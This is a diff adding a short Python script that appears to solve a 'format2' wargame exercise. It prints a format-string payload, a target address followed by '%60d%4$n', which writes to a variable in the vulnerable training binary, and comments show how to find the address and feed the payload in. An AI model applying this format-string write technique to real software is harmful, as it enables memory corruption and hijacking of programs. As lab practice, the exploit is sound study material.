@@ -1,0 +1,5 @@
+#!/usr/bin/python
+
+#objdump -t format2 | grep target
+print "\xe4\x96\x04\x08"+"%60d%4$n"
+# $ ./format2 <<< `./format2.txt`
